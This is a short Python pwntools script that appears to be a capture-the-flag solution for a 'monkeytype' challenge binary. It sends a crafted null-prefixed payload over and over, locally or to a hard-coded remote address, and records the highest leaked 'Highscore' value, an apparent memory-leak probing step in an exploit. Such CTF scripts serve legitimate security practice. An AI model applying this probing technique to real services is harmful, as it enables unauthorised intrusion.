#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("monkeytype")


local = True 
if local:
    p = process("./monkeytype")
    #gdb.attach(p,'''''')
else:
    p = remote('34.124.157.94', 12321)

elf = context.binary = ELF('./monkeytype', checksec=False)

hight = 0
while(1):
    payload = b"\x00I will take over the world! Mojo!" 
    p.send(payload)
    p.recvuntil(b"Highscore: ")
    score = int(p.recvuntil(b" "))
    if score > hight:
        hight = score
        print("New hight score:", hex(hight))
p.interactive()